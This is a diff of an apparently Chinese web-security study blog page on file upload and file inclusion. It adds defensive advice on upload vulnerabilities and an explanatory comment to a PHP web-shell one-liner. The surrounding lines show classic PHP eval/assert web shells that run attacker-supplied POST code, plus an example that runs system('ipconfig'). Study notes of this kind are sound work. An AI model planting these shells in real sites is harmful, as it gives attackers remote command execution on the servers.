@@ -398,14 +398,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.8k
+                    4.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    17 分
                 </div>
                 
 
@@ -526,7 +526,7 @@ A<span class="token operator">||</span>B     <span class="token comment" spellch
 <ul>
 <li>PHP</li>
 </ul>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span>                                         <span class="token shell-comment comment">#解释 &lt;?php eval(</span><span class="token string">"system('ipconfig');"</span><span class="token punctuation">)</span><span class="token delimiter">?></span>
 <span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
 <ul>
 <li>JSP CMD WebShell</li>
@@ -633,6 +633,15 @@ pic.png shell.php shell.png
 <p><img src="http://106.52.86.96/202008230000/image-20200905165104956.png" alt=""> </p>
 </li>
 </ul>
+<h3 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h3><h4 id="系统运行时的防御"><a href="#系统运行时的防御" class="headerlink" title="系统运行时的防御"></a><strong>系统运行时的防御</strong></h4><p>​    1、文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
+<p>​    2、判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
+<p>​    3、使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p>
+<p>​    4、使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</p>
+<h4 id="系统开发阶段的防御"><a href="#系统开发阶段的防御" class="headerlink" title="系统开发阶段的防御"></a><strong>系统开发阶段的防御</strong></h4><p>​    1、系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。</p>
+<p>​    2、对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。</p>
+<h4 id="系统维护阶段的防御"><a href="#系统维护阶段的防御" class="headerlink" title="系统维护阶段的防御"></a><strong>系统维护阶段的防御</strong></h4><p>​    1、系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。</p>
+<p>​    2、定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。</p>
+<p>​    3、对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</p>
 <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
 <p>开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含</p>
 </blockquote>
@@ -1477,7 +1486,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">14.9k</span>&nbsp;字
+                class="white-color">15.8k</span>&nbsp;字
             
             
             
